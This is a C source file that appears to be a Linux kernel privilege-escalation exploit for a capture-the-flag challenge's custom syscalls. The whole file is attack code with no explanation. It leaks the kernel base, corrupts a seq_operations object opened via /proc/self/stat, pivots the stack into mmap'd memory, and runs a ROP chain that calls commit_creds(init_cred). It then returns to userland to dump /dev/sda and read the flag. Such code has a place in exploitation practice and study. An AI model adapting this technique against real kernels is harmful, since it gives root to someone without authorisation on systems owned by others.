#include "utils.h"

#define INIT 600
#define CLOSE 601
#define SET 602
#define GET 603
#define LEN 604
char buffer[0x1000] = {0};
u64* tmp = (u64*) buffer;
u64 user_cs, user_ss, user_sp, user_rflags;
u64 modprobe_path = 0x1850da0;
u64 kernel_base, heap_base;
u64 commit_creds = 0x090650;
u64 prepare_kernel_cred = 0x0908f0;
u64 kpti_trampoline = 0xe00df0 + 0x16;
u64 pop_rdi = 0x1c4b;
u64 gadget = 0x16ae0f;
u64 init_cred = 0x1850360;
int do_init(u64);
int do_close();
int do_set(u64, u64);
int do_get(u64, u64);
int do_len(u64);
void save_state(void);

void get_flag()
{
    puts("[!] Return to userland!");
    system("cat /dev/sda > /flag.txt");
    system("cat /flag.txt");
}
int main()
{
    save_state();

    int ptmx_fd = open("/dev/ptmx",O_RDWR | O_NOCTTY);
    close(ptmx_fd);
    do_init(128);
    do_get(3, tmp);

    kernel_base = tmp[0] - 0x1278960;
    commit_creds += kernel_base;
    prepare_kernel_cred += kernel_base;
    kpti_trampoline += kernel_base;
    pop_rdi += kernel_base;
    gadget += kernel_base;
    init_cred += kernel_base;

    int seq_fd[0x30] = {0};
    for (int i=0;i<0x30;i++)
        seq_fd[i] = open("/proc/self/stat", O_RDONLY);
    close(seq_fd[0]);
    do_init(0x2000000000000004);

    do_set(4, gadget);

    u64 pivot_target = gadget & 0xffffffff;
    void *fake_stack = mmap(pivot_target & 0xffff0000, 0x50000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    if (fake_stack == -1) 
        panic("Fake stack error");

    u64 rop[] = {
        pop_rdi,
        init_cred,
        commit_creds,
        kpti_trampoline,
        0xcafebeef,
        0xcafebeef,
        (u64) get_flag,
        user_cs,
        user_rflags,
		user_sp,
		user_ss
    };

    memcpy((void *)pivot_target, rop, sizeof(rop));

    debug("trigger");
    char tmp_seq[0x30] = {0};
    for (int i=1;i<0x30;i++)
        read(seq_fd[i], tmp_seq, 1);

    debug("clgt");
}


int do_init(u64 count)
{
    return syscall(INIT, count);
}

int do_close()
{
    return syscall(CLOSE);
}

int do_set(u64 index, u64 data)
{
    return syscall(SET, index, data);
}

int do_get(u64 index, u64 dest)
{
    return syscall(GET, index, dest);
}

int do_len(u64 dest)
{
    return syscall(LEN, dest);
}

void save_state(void) {
   __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"              // move value of register cs to variable user_cs 
        "mov user_ss, ss;"              // move value of register ss to variable user_ss
        "mov user_sp, rsp;"             // move value of register rsp to variable user_sp
        "pushf;"                        // push flags onto stack (16 bit) 
        "pop user_rflags;"              // pop flags to variable user_rflags
        ".att_syntax;"
    );
    printf("[*] Saved state\n"); 
}
